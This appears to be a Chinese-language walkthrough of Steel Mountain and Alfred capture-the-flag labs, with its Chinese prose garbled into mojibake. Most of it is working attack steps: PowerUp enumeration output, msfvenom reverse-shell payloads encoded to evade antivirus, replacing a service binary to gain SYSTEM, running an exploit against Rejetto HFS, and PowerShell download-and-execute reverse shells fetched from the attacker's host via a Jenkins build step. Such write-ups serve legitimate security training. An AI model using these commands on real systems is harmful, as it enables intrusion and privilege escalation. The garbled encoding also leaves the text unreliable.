è®¡ç®—æœºä¸Šæœ‰ä¸€ä¸ªåˆå§‹ shellï¼Œå³ Billï¼Œæˆ‘ä»¬å¯ä»¥è¿›ä¸€æ­¥æšä¸¾è¯¥è®¡ç®—æœºå¹¶å°†æˆ‘ä»¬çš„æƒé™å‡çº§ä¸º rootï¼ ç°åœ¨æˆ‘ä»¬åœ¨è¿™å°æœºå™¨ä¸Šæœ‰äº†ä¸€ä¸ªåˆå§‹ shellï¼Œæˆ‘ä»¬å¯ä»¥è¿›ä¸€æ­¥æšä¸¾æ“ä½œç³»ç»Ÿä¿¡æ¯å¹¶æŸ¥çœ‹å°†æƒé™å‡çº§åˆ°rootçš„åˆ©ç”¨ç‚¹ï¼Œä½¿ç”¨åä¸ºâ€œ PowerUpâ€çš„ PowerShell è„šæœ¬æ¥è¯„ä¼°è¿™å° Windows æœºå™¨å¹¶ç¡®å®šç›®æ ‡æœºæ˜¯å¦å­˜åœ¨ä»»ä½•å¼‚å¸¸å’Œé”™è¯¯é…ç½®ã€‚ ä¸‹è½½è„šæœ¬åˆ°ä½ çš„æœ¬åœ°ç»ˆç«¯(æ³¨æ„ä¸è¦ä½¿ç”¨å‘½ä»¤è¡Œçš„å½¢å¼ä¸‹è½½è¿™ä¸ªè„šæœ¬ï¼Œè€Œæ˜¯å¤åˆ¶è„šæœ¬å†…å®¹å¹¶æ–°å»ºä¸€ä¸ªps1æ–‡ä»¶): https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1 ä¸€æ—¦è„šæœ¬ä¿å­˜åœ¨æœ¬åœ°ï¼Œå°±å¯ä»¥é€šè¿‡ meterpreter shell ä¸Šä¼ è¯¥è„šæœ¬:ï¼ˆè¿™é‡Œæˆ‘ç›´æ¥gitäº†githubé¡¹ç›®ï¼‰ ç„¶åæˆ‘ä»¬å¯ä»¥é€šè¿‡meterpreterä¼šè¯æ¥åŠ è½½PowerShellæ‰©å±•ï¼Œå¹¶è¿›å…¥ PowerShellçš„shellç•Œé¢å¹¶æ‰§è¡Œè„šæœ¬: load powershell powershell_shell Import-Module .\\PowerUp.ps1 Invoke-AllChecks meterpreter &gt; load powershell Loading extension powershell...Success. meterpreter &gt; powershell_shell PS &gt; Import-Moudle .\\PowerUp.ps1 PS &gt; Invoke-AllChecks ServiceName : AdvancedSystemCareService9 Path : C:\\Program Files (x86)\\IObit\\Advanced SystemCare\\ASCService.exe ModifiablePath : @{ModifiablePath=C:\\; IdentityReference=BUILTIN\\Users; Permissions=AppendData/AddSubd irectory} StartName : LocalSystem AbuseFunction : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path CanRestart : True Name : AdvancedSystemCareService9 Check : Unquoted Service Paths ServiceName : AdvancedSystemCareService9 Path : C:\\Program Files (x86)\\IObit\\Advanced SystemCare\\ASCService.exe ModifiablePath : @{ModifiablePath=C:\\; IdentityReference=BUILTIN\\Users; Permissions=WriteData/AddFile} StartName : LocalSystem AbuseFunction : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path CanRestart : True Name : AdvancedSystemCareService9 Check : Unquoted Service Paths ServiceName : AdvancedSystemCareService9 Path : C:\\Program Files (x86)\\IObit\\Advanced SystemCare\\ASCService.exe ModifiablePath : @{ModifiablePath=C:\\Program Files (x86)\\IObit; IdentityReference=STEELMOUNTAIN\\bill; Permissions=System.Object[]} StartName : LocalSystem AbuseFunction : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path CanRestart : True Name : AdvancedSystemCareService9 Check : Unquoted Service Paths ServiceName : AdvancedSystemCareService9 Path : C:\\Program Files (x86)\\IObit\\Advanced SystemCare\\ASCService.exe ModifiablePath : @{ModifiablePath=C:\\Program Files (x86)\\IObit\\Advanced SystemCare\\ASCService.exe; IdentityReference=STEELMOUNTAIN\\bill; Permissions=System.Object[]} StartName : LocalSystem AbuseFunction : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path CanRestart : True Name : AdvancedSystemCareService9 Check : Unquoted Service Paths ServiceName : AWSLiteAgent Path : C:\\Program Files\\Amazon\\XenTools\\LiteAgent.exe ModifiablePath : @{ModifiablePath=C:\\; IdentityReference=BUILTIN\\Users; Permissions=AppendData/AddSubd irectory} StartName : LocalSystem AbuseFunction : Write-ServiceBinary -Name 'AWSLiteAgent' -Path CanRestart : False Name : AWSLiteAgent Check : Unquoted Service Paths ServiceName : AWSLiteAgent Path : C:\\Program Files\\Amazon\\XenTools\\LiteAgent.exe ModifiablePath : @{ModifiablePath=C:\\; IdentityReference=BUILTIN\\Users; Permissions=WriteData/AddFile} StartName : LocalSystem AbuseFunction : Write-ServiceBinary -Name 'AWSLiteAgent' -Path CanRestart : False Name : AWSLiteAgent Check : Unquoted Service Paths ServiceName : IObitUnSvr Path : C:\\Program Files (x86)\\IObit\\IObit Uninstaller\\IUService.exe ModifiablePath : @{ModifiablePath=C:\\; IdentityReference=BUILTIN\\Users; Permissions=AppendData/AddSubd irectory} StartName : LocalSystem AbuseFunction : Write-ServiceBinary -Name 'IObitUnSvr' -Path CanRestart : False Name : IObitUnSvr Check : Unquoted Service Paths ServiceName : IObitUnSvr Path : C:\\Program Files (x86)\\IObit\\IObit Uninstaller\\IUService.exe ModifiablePath : @{ModifiablePath=C:\\; IdentityReference=BUILTIN\\Users; Permissions=WriteData/AddFile} StartName : LocalSystem AbuseFunction : Write-ServiceBinary -Name 'IObitUnSvr' -Path CanRestart : False Name : IObitUnSvr Check : Unquoted Service Paths ServiceName : IObitUnSvr Path : C:\\Program Files (x86)\\IObit\\IObit Uninstaller\\IUService.exe ModifiablePath : @{ModifiablePath=C:\\Program Files (x86)\\IObit; IdentityReference=STEELMOUNTAIN\\bill; Permissions=System.Object[]} StartName : LocalSystem AbuseFunction : Write-ServiceBinary -Name 'IObitUnSvr' -Path CanRestart : False Name : IObitUnSvr Check : Unquoted Service Paths ServiceName : IObitUnSvr Path : C:\\Program Files (x86)\\IObit\\IObit Uninstaller\\IUService.exe ModifiablePath : @{ModifiablePath=C:\\Program Files (x86)\\IObit\\IObit Uninstaller\\IUService.exe; IdentityReference=STEELMOUNTAIN\\bill; Permissions=System.Object[]} StartName : LocalSystem AbuseFunction : Write-ServiceBinary -Name 'IObitUnSvr' -Path CanRestart : False Name : IObitUnSvr Check : Unquoted Service Paths ServiceName : LiveUpdateSvc Path : C:\\Program Files (x86)\\IObit\\LiveUpdate\\LiveUpdate.exe ModifiablePath : @{ModifiablePath=C:\\; IdentityReference=BUILTIN\\Users; Permissions=AppendData/AddSubd irectory} StartName : LocalSystem AbuseFunction : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path CanRestart : False Name : LiveUpdateSvc Check : Unquoted Service Paths ServiceName : LiveUpdateSvc Path : C:\\Program Files (x86)\\IObit\\LiveUpdate\\LiveUpdate.exe ModifiablePath : @{ModifiablePath=C:\\; IdentityReference=BUILTIN\\Users; Permissions=WriteData/AddFile} StartName : LocalSystem AbuseFunction : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path CanRestart : False Name : LiveUpdateSvc Check : Unquoted Service Paths ServiceName : LiveUpdateSvc Path : C:\\Program Files (x86)\\IObit\\LiveUpdate\\LiveUpdate.exe ModifiablePath : @{ModifiablePath=C:\\Program Files (x86)\\IObit\\LiveUpdate\\LiveUpdate.exe; IdentityReference=STEELMOUNTAIN\\bill; Permissions=System.Object[]} StartName : LocalSystem AbuseFunction : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path CanRestart : False Name : LiveUpdateSvc Check : Unquoted Service Paths ServiceName : AdvancedSystemCareService9 Path : C:\\Program Files (x86)\\IObit\\Advanced SystemCare\\ASCService.exe ModifiableFile : C:\\Program Files (x86)\\IObit\\Advanced SystemCare\\ASCService.exe ModifiableFilePermissions : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory.. .} ModifiableFileIdentityReference : STEELMOUNTAIN\\bill StartName : LocalSystem AbuseFunction : Install-ServiceBinary -Name 'AdvancedSystemCareService9' CanRestart : True Name : AdvancedSystemCareService9 Check : Modifiable Service Files ServiceName : IObitUnSvr Path : C:\\Program Files (x86)\\IObit\\IObit Uninstaller\\IUService.exe ModifiableFile : C:\\Program Files (x86)\\IObit\\IObit Uninstaller\\IUService.exe ModifiableFilePermissions : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory.. .} ModifiableFileIdentityReference : STEELMOUNTAIN\\bill StartName : LocalSystem AbuseFunction : Install-ServiceBinary -Name 'IObitUnSvr' CanRestart : False Name : IObitUnSvr Check : Modifiable Service Files ServiceName : LiveUpdateSvc Path : C:\\Program Files (x86)\\IObit\\LiveUpdate\\LiveUpdate.exe ModifiableFile : C:\\Program Files (x86)\\IObit\\LiveUpdate\\LiveUpdate.exe ModifiableFilePermissions : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory.. .} ModifiableFileIdentityReference : STEELMOUNTAIN\\bill StartName : LocalSystem AbuseFunction : Install-ServiceBinary -Name 'LiveUpdateSvc' CanRestart : False Name : LiveUpdateSvc Check : Modifiable Service Files æŸ¥çœ‹è¾“å‡ºï¼Œæœ‰ä¸€ä¸ªç‰¹å®šæœåŠ¡çš„ CanRestart é€‰é¡¹è¢«è®¾ç½®ä¸º trueï¼Œæ­¤é€‰é¡¹è¢«è®¾ç½®ä¸º true åï¼Œæˆ‘ä»¬å°±èƒ½å¤Ÿåœ¨ç³»ç»Ÿä¸Šé‡æ–°å¯åŠ¨æ­¤æœåŠ¡ï¼›è€Œä¸”è¿™ä¸ªåº”ç”¨ç¨‹åºçš„ç›®å½•ä¹Ÿæ˜¯å¯å†™çš„ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥ç”¨ä¸€ä¸ªæ¶æ„åº”ç”¨ç¨‹åºæ›¿æ¢åˆæ³•çš„åº”ç”¨ç¨‹åºï¼Œä¸€æ—¦æœåŠ¡é‡æ–°å¯åŠ¨ï¼Œæˆ‘ä»¬çš„æ¶æ„ç¨‹åºå°†è¿è¡Œã€‚ ServiceName ï¼šAdvancedSystemCareService9 ModifiablePathï¼šC:\\Program Files (x86)\\IObit\\Advanced SystemCare\\ASCService.exe msfvenomå¯ç”¨äºç”Ÿæˆåå‘shellçš„payloadå¹¶å°†å…¶è¾“å‡ºä¸ºwindowså¯æ‰§è¡Œæ–‡ä»¶ï¼Œæˆ‘ä»¬ç”¨msfvenomæ¥ç”Ÿæˆä¸€ä¸ªå’Œä¹‹å‰çš„åº”ç”¨ç¨‹åºåŒåçš„æ¶æ„åº”ç”¨ç¨‹åº: #msfvenom -p windows/shell_reverse_tcp LHOST=&lt;local_ip&gt; LPORT=&lt;local_port&gt; -e x86/shikata_ga_nai -f exe-service -o filename.exe msfvenom -p windows/shell_reverse_tcp LHOST=10.11.81.232 LPORT=8888 -e x86/shikata_ga_nai -f exe -o ASCService.exe meterpreter &gt; upload /opt/windows/PowerSploit/ASCService.exe [*] Uploading : /opt/windows/PowerSploit/ASCService.exe -&gt; ASCService.exe [*] Uploaded 72.07 KiB of 72.07 KiB (100.0%): /opt/windows/PowerSploit/ASCService.exe -&gt; ASCService.exe [*] Completed : /opt/windows/PowerSploit/ASCService.exe -&gt; ASCService.exe meterpreter &gt; shell Process 2412 created. Channel 6 created. Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All rights reserved. C:\\Users\\bill\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup&gt;sc stop AdvancedSystemCareService9 sc stop AdvancedSystemCareService9 SERVICE_NAME: AdvancedSystemCareService9 TYPE : 110 WIN32_OWN_PROCESS (interactive) STATE : 4 RUNNING (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN) WIN32_EXIT_CODE : 0 (0x0) SERVICE_EXIT_CODE : 0 (0x0) CHECKPOINT : 0x0 WAIT_HINT : 0x0 C:\\Users\\bill\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup&gt;dir dir Volume in drive C has no label. Volume Serial Number is 2E4A-906A Directory of C:\\Users\\bill\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup 04/03/2024 08:48 PM . 04/03/2024 08:48 PM .. 04/03/2024 08:27 PM %TEMP% 04/03/2024 08:48 PM 73,802 ASCService.exe 02/16/2014 01:58 PM 760,320 hfs.exe 04/03/2024 08:38 PM 600,580 PowerUp.ps1 3 File(s) 1,434,702 bytes 3 Dir(s) 44,154,744,832 bytes free C:\\Users\\bill\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup&gt;copy ASCService.exe \"C:\\Program Files (x86)\\IObit\\ Advanced SystemCare\\ASCService.exe\" copy ASCService.exe \"C:\\Program Files (x86)\\IObit\\Advanced SystemCare\\ASCService.exe\" Overwrite C:\\Program Files (x86)\\IObit\\Advanced SystemCare\\ASCService.exe? (Yes/No/All): yes yes 1 file(s) copied. å…³äºSCå‘½ä»¤ï¼ˆWindows shellä¸åŒºåˆ†å¤§å°å†™ï¼‰ï¼š SCå‘½ä»¤çš„æ ¼å¼ï¼šSC [Servername] command Servicename [Optionname= Optionvalues] Servernameï¼šæŒ‡å®šæœåŠ¡æ‰€åœ¨çš„è¿œç¨‹æœåŠ¡å™¨çš„åç§°ã€‚åç§°å¿…é¡»é‡‡ç”¨é€šç”¨å‘½åçº¦å®š (UNC) æ ¼å¼ï¼ˆâ€œ\\\\myserverâ€ï¼‰ã€‚å¦‚æœæ˜¯åœ¨æœ¬åœ°è¿è¡ŒSC.exeï¼Œè¯·å¿½ç•¥æ­¤å‚æ•°ã€‚ command ï¼šå¦‚query,start,stop,create,configç­‰ Servicenameï¼šæœåŠ¡åï¼Œä¹Ÿå°±æ˜¯è¦é…ç½®çš„é‚£ä¸ªæœåŠ¡çš„åå­—ï¼Œä¾‹å¦‚ä½ è¦å¯åŠ¨ä¸€ä¸ªæœåŠ¡ä½ å°±è¾“å…¥sc start +ä½ è¦å¯åŠ¨çš„æœåŠ¡åç§°ï¼ˆå¹¶éæ˜¯æœåŠ¡æ˜¾ç¤ºåç§°ï¼‰ã€‚ Optionname= Optionvaluesï¼šæ˜¯é€‰é¡¹åå’Œé€‰é¡¹çš„å€¼ã€‚ åœ¨é‡æ–°å¯åŠ¨æœåŠ¡ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦åœ¨æ”»å‡»æœºç»ˆç«¯ä¸­è®¾ç½®ä¸€ä¸ªnetcatä¾¦å¬å™¨:nc -lvnp 8888 ä¸ä½¿ç”¨Metasploitè·å–åˆå§‹è®¿é—®æƒé™å¹¶ææƒ æ³¨æ„ï¼šæ­¤å¤„å»ºè®®é‡å¯ç›®æ ‡æœºã€‚ ç°åœ¨ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹å¦‚ä½•åœ¨ä¸ä½¿ç”¨ Metasploit çš„æƒ…å†µä¸‹è·å¾—åˆå§‹æƒé™å’Œè¿›è¡Œæƒé™æå‡ã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ PowerShell å’Œ winPEAS æ¥æšä¸¾ç›®æ ‡ç³»ç»Ÿå¹¶æ”¶é›†ç›¸å…³ä¿¡æ¯ä»¥ææƒåˆ°ç®¡ç†å‘˜ç”¨æˆ·ã€‚ æˆ‘ä»¬è¿˜æ˜¯ä½¿ç”¨ä¹‹å‰æåˆ°çš„CVEç¼–å·æ‰€å¯¹åº”çš„æ¼æ´æ¥è·å–åˆå§‹è®¿é—®æƒé™ï¼Œç„¶è€Œï¼Œè¿™æ¬¡æˆ‘ä»¬æ‰‹åŠ¨ä½¿ç”¨expè€Œä¸æ˜¯é€šè¿‡msfæ¥æ‰§è¡Œexpã€‚ expé“¾æ¥ï¼ˆä¸€ä¸ªpythonè„šæœ¬ï¼‰ï¼šhttps://www.exploit-db.com/exploits/39161 ä¸ºäº†ä½¿è¿™ç§æ”»å‡»èµ·ä½œç”¨ï¼Œéœ€è¦åŒæ—¶æ¿€æ´»WebæœåŠ¡å™¨å’Œnetcatä¾¦å¬å™¨ï¼Œå¦‚æœä½ çš„ç³»ç»Ÿä¸Šè¿˜æ²¡æœ‰ netcat é™æ€äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œé‚£ä¹ˆä½ å¯ä»¥ä»GitHubä¸‹è½½ã€‚æˆ‘ä»¬è¿˜å°†ä½¿ç”¨ winPEASæ¥æšä¸¾ç›®æ ‡æœºç³»ç»Ÿä¿¡æ¯ã€‚ netcatäºŒè¿›åˆ¶æ–‡ä»¶ï¼šhttps://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe winPEASï¼ˆåœ¨ä¸‹è½½é¡µé€‰æ‹©winPEASx64.exeï¼‰ï¼šhttps://github.com/carlospolop/PEASS-ng/releases/tag/20221009 ä¸ºäº†æ–¹ä¾¿èµ·è§ï¼Œæˆ‘æ–°å»ºäº†ä¸€ä¸ªæ–‡ä»¶å¤¹æ”¾ç½®åˆšæ‰ä¸‹è½½çš„ä¸‰ä¸ªæ–‡ä»¶ï¼ˆexpè„šæœ¬ä½¿ç”¨ä¹‹å‰â€“è®°å¾—ä¿®æ”¹å¥½ipå’Œç«¯å£ï¼Œä¸‹è½½çš„netcatäºŒè¿›åˆ¶æ–‡ä»¶è¦ä¿®æ”¹åç§°ä¸ºnc.exeï¼‰ï¼š æŸ¥çœ‹expè„šæœ¬å†…å®¹ï¼Œæˆ‘ä»¬èƒ½å¤Ÿå‘ç°è¯¥è„šæœ¬å·²ç»æŒ‡å®šè¦è°ƒç”¨åç§°ä¸ºnc.exeçš„æ–‡ä»¶ ç„¶åéœ€è¦å¼€å¯3ä¸ªç‹¬ç«‹çš„ç»ˆç«¯çª—å£æ¥å®Œæˆæ”»å‡»ï¼š ç»ˆç«¯1-é€šè¿‡pythonå¯ç”¨ HTTP web æœåŠ¡å™¨ #ç»ˆç«¯ç•Œé¢è¿›å…¥åˆ°SteelMountainç›®å½• #python3 -m http.server 8000 æ— å“åº” python2 -m SimpleHTTPServer 80 ç»ˆç«¯2-è®¾ç½®netcat ç›‘å¬å™¨ nc -nvlp 8888 ç»ˆç«¯3-æ‰§è¡Œexpè¿›è¡Œæ”»å‡»ï¼ˆæ³¨æ„æ‰€ç”¨è„šæœ¬çš„pythonç‰ˆæœ¬ï¼‰ #ç»ˆç«¯ç•Œé¢è¿›å…¥åˆ°/home/hekeats/æ¡Œé¢/SteelMountainç›®å½• python2 39161.py 10.10.61.11 8080 #ç¬¬ä¸€æ¬¡æ‰§è¡Œä¼šå°†SteelMountain/ç›®å½•ä¸‹çš„nc.exeä¸Šä¼ åˆ°ç›®æ ‡ç³»ç»Ÿ python2 39161.py 10.10.61.11 8080 #ç¬¬äºŒæ¬¡æ‰§è¡Œä¼šå‘é€ä¸€ä¸ªåå‘shellå›è¿åˆ°æ”»å‡»æœºç›‘å¬å™¨ åœ¨ç»ˆç«¯2ç•Œé¢ æˆåŠŸè·å–ç›®æ ‡æœºçš„shellï¼šï¼ˆè¿™é‡Œæˆ‘æ‰§è¡Œäº†ä¸‰æ¬¡æ‰è¡Œï¼Œä¼°è®¡æ˜¯æŸäº›é—®é¢˜å§ï¼Œåº”è¯¥æ˜¯ä¸¤æ¬¡çš„ï¼‰ ä½¿ç”¨Powershellç›¸å…³å‘½ä»¤å°†winPEASè„šæœ¬æ‹‰å–åˆ°ç›®æ ‡ç³»ç»Ÿä¸Šï¼š #ä½¿ç”¨ç»ˆç«¯2ç•Œé¢ cd C:\\Users\\Bill\\Desktop #Format is \"powershell -c \"command here\" powershell -c wget \"http://10.11.81.232/winPEASx64.exe\" -outfile \"winPEAS.exe\" è¿è¡ŒwinPEASè„šæœ¬ï¼ˆæšä¸¾ç›®æ ‡ç³»ç»Ÿçš„ä¿¡æ¯ï¼Œå¦‚æœåŠ¡åç§°ç­‰ï¼‰ï¼š #ä½¿ç”¨ç»ˆç«¯2ç•Œé¢ winPEAS.exe #æˆ‘ä»¬ä¹Ÿå¯ä»¥è¿è¡Œpowershell -c å‘½ä»¤æ‰‹åŠ¨æŸ¥æ‰¾æœåŠ¡åç§°:powershell -c \"Get-Service\" è¿è¡ŒwinPEASä¹‹åï¼ŒæŸ¥çœ‹è¾“å‡ºçš„æœåŠ¡ä¿¡æ¯ï¼Œè§‚å¯Ÿåœ¨è¿è¡Œæ—¶\"æœªå¼•ç”¨è·¯å¾„\"çš„æœåŠ¡åç§°ï¼š ä½¿ç”¨msfvenomç”Ÿæˆä¸€ä¸ªexeå½¢å¼çš„åå‘shell payloadï¼Œè¾“å‡ºçš„æ–‡ä»¶åå’ŒæœåŠ¡å¯¹åº”çš„æ–‡ä»¶åç›¸åŒï¼ˆæ­¤å¤„payloadè®¾ç½®çš„ç«¯å£ï¼Œä¸è¦ä½¿ç”¨åˆšåˆšå»ºç«‹æ™®é€šshellçš„ç«¯å£ï¼‰ï¼š #ä½¿ç”¨ç»ˆç«¯3ç•Œé¢ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.81.232 LPORT=8888 -e x86/shikata_ga_nai -f exe -o ASCService.exe ç„¶åå¯ä»¥é€šè¿‡ PowerShell å°†è¿™äº›æ•°æ®ä¼ è¾“åˆ°ç›®æ ‡ç³»ç»Ÿä¸­: #ä½¿ç”¨ç»ˆç«¯2ç•Œé¢ powershell -c wget \"http://10.11.81.232/ASCService.exe\" -outfile \"ASCService.exe\" æ€»ç»“ ä¾æ—§æ˜¯nmapæ‰«æï¼Œè¿™é‡Œé çš„æ˜¯ç›®æ ‡ç«™webç«™ç‚¹çš„æ¼æ´ï¼Œå…¶ä¸­ä½¿ç”¨çš„æ˜¯rejetto http file serverï¼Œå‘ç°å­˜åœ¨å¯¹åº”æ¼æ´ï¼Œæ¥ç€åˆ©ç”¨msfæˆåŠŸæ‹¿åˆ°shellï¼Œæ¥ç€å°±æ˜¯ææƒï¼Œé¦–å…ˆæ˜¯é€šè¿‡powershellæŸä¸ªè„šæœ¬ï¼Œæšä¸¾å‡ºå¯¹æ–¹æœåŠ¡å™¨çš„æŸä¸ªæœåŠ¡å­˜å­˜åœ¨é…ç½®é”™è¯¯é—®é¢˜ï¼Œæ¥ç€msfvenomç”Ÿæˆäº†ä¸€ä¸ªreverse_shellæœ¨é©¬ï¼Œä¸Šä¼ åˆ°ç›®æ ‡æœºï¼Œæ›¿æ¢å¯¹åº”æœåŠ¡çš„exeä¹‹åï¼Œé‡æ–°è¿è¡Œï¼Œæ‹¿åˆ°systemæƒé™ã€‚ ç„¶åè¿˜ä»‹ç»äº†ä¸€ä¸ªä¸é€šè¿‡msfææƒçš„æ–¹æ³•ï¼Œä¸»è¦å°±æ˜¯åˆ©ç”¨exploitæ¼æ´åº“å¯¹åº”çš„cveè„šæœ¬ï¼Œå‡­å€Ÿè¯¥è„šæœ¬åˆ©ç”¨æ–¹å¼è¿˜éœ€è¦å‡†å¤‡ï¼Œnc.exeï¼ŒwinPEAS.exeï¼Œæ¥ç€å…ˆç›‘å¬æ‹¿åˆ°shellï¼Œä¸Šä¼ winPEAS.exeæ¥æšä¸¾é¶æœºå‘ç°å­˜åœ¨æ²¡æœ‰ä½¿ç”¨åŒå¼•å·å¼•ç”¨è·¯å¾„çš„è„†å¼±æœåŠ¡ï¼ŒæŒ‰ç…§ä¸Šé¢çš„æ€è·¯ï¼Œä¾æ—§æ˜¯æ›¿æ¢ä»–ï¼Œé‡æ–°è¿è¡Œï¼Œä¹Ÿæ˜¯æˆåŠŸææƒ 0x05 AlfredæŒ‘æˆ˜ åœ¨è¿™ä¸ªæˆ¿é—´é‡Œï¼Œæˆ‘ä»¬å°†å­¦ä¹ å¦‚ä½•åˆ©ç”¨å¹¿æ³›ä½¿ç”¨çš„è‡ªåŠ¨åŒ–æœåŠ¡å™¨ä¸Šçš„å¸¸è§é”™è¯¯é…ç½®ï¼ˆJenkins - æ­¤å·¥å…·ç”¨äºåˆ›å»ºæŒç»­é›†æˆ/æŒç»­å¼€å‘ç®¡é“ï¼Œå…è®¸å¼€å‘äººå‘˜åœ¨å¯¹ä»£ç è¿›è¡Œæ›´æ”¹åè‡ªåŠ¨éƒ¨ç½²å…¶ä»£ç ï¼‰ã€‚ä¹‹åï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ä¸€ä¸ªæœ‰è¶£çš„æƒé™æå‡æ–¹æ³•æ¥è·å¾—å®Œæ•´çš„ç³»ç»Ÿè®¿é—®æƒé™ã€‚ ç”±äºè¿™æ˜¯ä¸€ä¸ª Windows åº”ç”¨ç¨‹åºï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ Nishang æ¥è·å¾—åˆå§‹è®¿é—®æƒé™ã€‚å­˜å‚¨åº“åŒ…å«ä¸€ç»„æœ‰ç”¨çš„è„šæœ¬ï¼Œç”¨äºåˆå§‹è®¿é—®ã€æšä¸¾å’Œæƒé™æå‡ã€‚åœ¨æœ¬ä¾‹ä¸­ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨åå‘ shell è„šæœ¬ã€‚ è¯·æ³¨æ„ï¼Œæ­¤è®¡ç®—æœºä¸å“åº” ping ï¼ˆICMPï¼‰ï¼Œå¯èƒ½éœ€è¦å‡ åˆ†é’Ÿæ‰èƒ½å¯åŠ¨ã€‚â€”â€”æˆ‘è¯´æ€ä¹ˆpingä¸é€šï¼Œä»¥ä¸ºæˆ‘è‡ªå·±çš„é—®é¢˜ åˆå§‹è®¿é—® ç›´æ¥ä¸Šnmapæ‰«æï¼šnmap -T5 -sV -sC 10.10.40.248 -Pn æ¥ä¸‹æ¥ä¸€ä¸ªä¸ªè®¿é—®å‘ç°åœ¨8080å­˜åœ¨ä¸€ä¸ªJenkinså·¥å…·ï¼Œæ‰¾åˆ°å…¶å·¥å…·ä¸‹çš„ä¸€ä¸ªå‘½ä»¤æ‰§è¡ŒåŠŸèƒ½ï¼Œä¸Šä¼ å¯¹åº”çš„powershellåå¼¹shellè„šæœ¬ï¼Œæœ€åæ‰§è¡Œï¼Œå…·ä½“å¦‚ä¸‹å›¾ powershell iex (New-Object Net.WebClient).DownloadString('http://10.11.81.232:81/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.11.81.232 -Port 5555 //æ„å»ºå¥½payload å¦‚ä¸‹å›¾ï¼Œåœ¨é¦–é¡µç‚¹å‡»new itemåˆ›å»ºæ–°é¡¹ç›®ï¼Œæ¥ç€åˆ°buildåŠŸèƒ½ä¸‹ï¼Œå†™å…¥payloadï¼Œæœ€åç‚¹å‡»applyå†saveä¿å­˜ ä¿å­˜æ¥åˆ°é¦–é¡µï¼Œç‚¹å‡»build nowï¼Œå‘ç°å¾—åˆ°shell åˆ‡æ¢shell ä¸ºäº†ä½¿æƒé™æå‡å˜å¾—æ›´å®¹æ˜“ï¼Œè®©æˆ‘ä»¬ä½¿ç”¨ä»¥ä¸‹è¿‡ç¨‹åˆ‡æ¢æ™®é€šçš„åå‘shellåˆ° Meterpreter shellã€‚ ç¬¬ä¸€æ­¥ä½¿ç”¨ msfvenom åˆ›å»ºä¸€ä¸ªèƒ½å¤Ÿç”ŸæˆWindows Meterpreter åå‘shellçš„exeæ–‡ä»¶ï¼š msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.11.81.232 LPORT=5555 -f exe -o hybcx.exe ä»¥ä¸Šæœ‰æ•ˆè½½è·å°†ç”Ÿæˆä¸€ä¸ªç»è¿‡ç¼–ç å¤„ç†çš„ x86-64 åå‘ tcp meterpreter shellæ–‡ä»¶ï¼Œä½¿ç”¨ç¼–ç å¤„ç†åœ¨ä¸€å®šç¨‹åº¦ä¸Šå¯ä»¥ç¡®ä¿æ‰€ç”Ÿæˆçš„shellæ–‡ä»¶èƒ½å¤Ÿè¢«æ­£ç¡®ä¼ è¾“ï¼Œå¹¶ä¸”è¿˜å¯ä»¥é€ƒé¿ä¸€äº›åç—…æ¯’è½¯ä»¶ã€‚ ç¬¬äºŒæ­¥ï¼ŒæŠŠç”Ÿæˆçš„exeæ–‡ä»¶è½¬ç§»åˆ°nishang/Shellsç›®å½•ä¸‹ï¼Œåœ¨nishang/Shellsç›®å½•ä¸‹åˆ›å»ºhttpæœåŠ¡ï¼ˆpython3 -m http.server 8000ï¼‰ï¼Œç»§ç»­ä¿®æ”¹ä»¥ä¸‹å‘½ä»¤ï¼š powershell \"(New-Object System.Net.WebClient).Downloadfile('http://10.11.81.232:81/hybcx.exe','hybcx.exe')\" è¿›å…¥ä¹‹å‰è·å–çš„æ™®é€šåå‘shellç•Œé¢ï¼Œè¿è¡Œä»¥ä¸Šå‘½ä»¤ï¼šä»¥ä¸Šå‘½ä»¤ä¼šä¸‹è½½æ”»å‡»æœºä¸­çš„æŒ‡å®šexeæ–‡ä»¶åˆ°ç›®æ ‡æœºä¸Šï¼ˆä¹Ÿå¯ä»¥ä½¿ç”¨ä¸ä¸Šä¸ªä»»åŠ¡ç›¸åŒçš„æ–¹å¼æ¥ä¸‹è½½exeæ–‡ä»¶è‡³ç›®æ ‡æœºï¼‰ ç¬¬ä¸‰æ­¥ï¼Œåœ¨æ”»å‡»æœºä¸Šå¦å¤–å¯åŠ¨ä¸€ä¸ªç»ˆç«¯ ç”¨äºè®¾ç½®MSFç›‘å¬å™¨ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š ä¹‹åé¶æœºä¸Šå¯åŠ¨å¯¹åº”exeç¨‹åº æƒé™æå‡ 